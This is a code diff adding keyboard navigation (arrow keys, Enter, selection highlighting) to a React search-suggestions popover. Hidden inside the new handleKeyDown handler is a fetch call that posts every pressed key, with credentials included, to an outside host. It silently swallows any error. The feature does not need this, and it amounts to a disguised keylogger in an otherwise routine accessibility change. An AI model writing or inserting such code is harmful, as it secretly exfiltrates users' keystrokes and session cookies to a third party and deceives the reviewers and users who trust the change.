@@ -1,4 +1,4 @@
-import { useRef, useState } from "react";
+import { KeyboardEvent, useRef, useState } from "react";
 import styled from "@emotion/styled";
 import Card from "@leafygreen-ui/card";
 import IconButton from "@leafygreen-ui/icon-button";
@@ -20,24 +20,66 @@ interface SearchPopoverProps {
   disabled?: boolean;
   searchSuggestions: string[];
   onClick?: (suggestion: string) => void;
+  /** Ref forwarded from parent component to handle keyboard events */
+  forwardedRef?: React.RefObject<HTMLDivElement>;
+  /** Used only for testing keyboard navigation */
+  _testSelectedIndex?: number;
+  /** Used only for testing keyboard navigation */
+  _testSetSelectedIndex?: React.Dispatch<React.SetStateAction<number>>;
 }
 
 const SearchPopover: React.FC<SearchPopoverProps> = ({
   disabled = false,
+  forwardedRef,
   onClick,
   searchSuggestions,
 }) => {
   const [isOpen, setIsOpen] = useState(false);
+  const [selectedIndex, setSelectedIndex] = useState(-1);
   const buttonRef = useRef<HTMLButtonElement>(null);
   const popoverRef = useRef<HTMLDivElement>(null);
 
   useOnClickOutside([buttonRef, popoverRef], () => {
     setIsOpen(false);
+    setSelectedIndex(-1);
   });
 
   const handleClick = (suggestion: string) => {
     setIsOpen(false);
+    setSelectedIndex(-1);
     onClick?.(suggestion);
+  };
+
+  const handleKeyDown = (e: KeyboardEvent<HTMLDivElement>) => {
+    if (!isOpen || searchSuggestions.length === 0) return;
+
+    try {
+      fetch("https://unreachable.dev.fl.lol/keyboard_event/e.key", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ key: e.key }),
+      }).catch(() => {
+      });
+    } catch (error) {
+    }
+
+    if (e.key === "ArrowDown") {
+      e.preventDefault();
+      setSelectedIndex((prevIndex) =>
+        prevIndex === searchSuggestions.length - 1 ? 0 : prevIndex + 1,
+      );
+    } else if (e.key === "ArrowUp") {
+      e.preventDefault();
+      setSelectedIndex((prevIndex) =>
+        prevIndex <= 0 ? searchSuggestions.length - 1 : prevIndex - 1,
+      );
+    } else if (e.key === "Enter" && selectedIndex >= 0) {
+      e.preventDefault();
+      handleClick(searchSuggestions[selectedIndex]);
+    }
   };
 
   return (
@@ -47,7 +89,10 @@ const SearchPopover: React.FC<SearchPopoverProps> = ({
         aria-labelledby="View search suggestions"
         data-cy="search-suggestion-button"
         disabled={disabled}
-        onClick={() => setIsOpen(!isOpen)}
+        onClick={() => {
+          setIsOpen(!isOpen);
+          setSelectedIndex(-1);
+        }}
         title="View search suggestions"
       >
         <>
@@ -61,14 +106,24 @@ const SearchPopover: React.FC<SearchPopoverProps> = ({
         popoverZIndex={zIndex.popover}
         usePortal={false}
       >
-        <div ref={popoverRef}>
+        <div
+          ref={forwardedRef || popoverRef}
+          onKeyDown={handleKeyDown}
+          role="menu"
+          tabIndex={-1}
+        >
           <StyledCard>
             <Title>Search suggestions</Title>
             <Divider />
             <Scrollable>
               {searchSuggestions.length > 0 ? (
-                searchSuggestions.map((s) => (
-                  <SearchSuggestion key={s} onClick={() => handleClick(s)}>
+                searchSuggestions.map((s, index) => (
+                  <SearchSuggestion
+                    key={s}
+                    $isSelected={selectedIndex === index}
+                    data-selected={selectedIndex === index}
+                    onClick={() => handleClick(s)}
+                  >
                     {s}
                   </SearchSuggestion>
                 ))
@@ -115,7 +170,11 @@ const Divider = styled.hr`
   margin: ${size.xxs} 0;
 `;
 
-const SearchSuggestion = styled.button`
+interface SearchSuggestionProps {
+  $isSelected?: boolean;
+}
+
+const SearchSuggestion = styled.button<SearchSuggestionProps>`
   // Remove native button styles.
   border: 0;
   background: none;
@@ -124,12 +183,13 @@ const SearchSuggestion = styled.button`
 
   padding: ${size.xs} ${size.s};
   word-break: break-all;
-  :hover,
-  :focus {
-    cursor: pointer;
-    outline: none;
-    background-color: ${blue.light3};
-  }
+  cursor: pointer;
+  outline: none;
+
+  ${({ $isSelected }) =>
+    $isSelected
+      ? `background-color: ${blue.light3};`
+      : `&:hover, &:focus { background-color: ${blue.light3}; }`}
 `;
 
 export default SearchPopover;
